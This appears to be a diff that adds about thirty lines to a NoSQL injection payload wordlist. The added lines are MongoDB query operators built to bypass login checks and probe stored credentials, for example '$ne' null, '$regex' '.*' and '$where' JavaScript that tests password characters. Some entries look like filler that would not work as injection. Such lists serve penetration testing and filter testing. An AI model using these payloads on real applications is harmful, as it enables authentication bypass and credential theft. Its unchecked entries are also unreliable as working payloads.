@@ -12,3 +12,33 @@ $gt
 $regex
 $eq
 $func: "var_dump"
+{"username": {"$ne": null}}
+{"password": {"$regex": "^.*$"}}
+{"$where": "this.username == 'admin'"}
+{"username": {"$gt": ""}}
+{"$or": [{"username": "admin"}, {"password": "password"}]}
+{"username": {"$exists": true}}
+{"username": {"$in": ["admin", "user"]}}
+{"$where": "function() { return true; }"}
+{"password": {"$not": {"$size": 0}}}
+{"username": {"$regex": ".*"}}
+{"_id": {"$gt": 0}}
+{"$where": "this.password.length > 0"}
+{"username": {"$type": 2}}
+{"$where": "this.username.charAt(0) == 'a'"}
+{"password": {"$mod": [10, 0]}}
+{"username": {"$all": ["admin"]}}
+{"$where": "this.username.includes('admin')"}
+{"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}
+{"username": {"$elemMatch": {"$eq": "admin"}}}
+{"$where": "this.password.match(/admin/) != null"}
+{"password": {"$lt": 1000}}
+{"username": {"$nin": ["guest"]}}
+{"$where": "this.password.search('pass') != -1"}
+{"username": {"$size": 5}}
+{"password": {"$slice": [0, 3]}}
+{"username": {"$bitsAllSet": [1, 5]}}
+{"$where": "this.username.endsWith('n')"}
+{"password": {"$geoWithin": {"$center": [[0,0], 10]}}}
+{"username": {"$bitsAnySet": [1, 5]}}
+{"$where": "this.password.charCodeAt(0) > 64"}
